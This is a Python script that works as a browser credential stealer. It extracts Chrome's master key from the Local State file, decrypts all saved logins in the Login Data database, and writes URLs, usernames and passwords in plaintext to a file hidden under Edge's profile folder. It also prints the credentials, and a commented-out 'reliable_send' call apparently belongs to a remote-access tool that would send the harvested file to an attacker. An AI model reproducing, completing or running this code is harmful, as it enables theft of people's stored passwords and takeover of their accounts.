import os
import json
import base64
import win32crypt
import shutil
from datetime import timezone, datetime, timedelta
import time
from Crypto.Cipher import AES
import sqlite3

def chrome_get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def chrome_get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def chrome_decrypt_password(password, key):
    try:
    # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return "Not supported."


def chrome_pass():

    key = chrome_get_encryption_key()

    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")

    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()

    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    direc = os. getcwd()

    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Microsoft", "Edge","User Data", "Default")
        direc="temp"
        dir=os.path.join(local_state_path,direc)
        os.mkdir(dir)
    except:
        local_state_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Microsoft", "Edge","User Data", "Default")
        direc="temp"
        dir=os.path.join(local_state_path,direc)
    fileloc = '\\chrome_pass.txt'
    fileloc = dir+fileloc
    f = open(fileloc,"w+")
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = chrome_decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            f.write(f"Origin URL: {origin_url}")
            f.write(f"Action URL: {action_url}")
            f.write(f"Username: {username}")
            f.write(f"Password: {password}")
            print(username,password)
        else:
            continue
        if date_created != 86400000000 and date_created:
            f.write(f"Creation date: {str(chrome_get_chrome_datetime(date_created))}")
        if date_last_used != 86400000000 and date_last_used:
            f.write(f"Last Used: {str(chrome_get_chrome_datetime(date_last_used))}")
        f.write("="*50)
    cursor.close()
    db.close()
    f.close()
    try:
        os.remove(filename)
    except:
        pass
    return fileloc
    # fn = open(fileloc,"r")
    # print(fn.read())
    # reliable_send(fn.read())

# chrome_pass()
    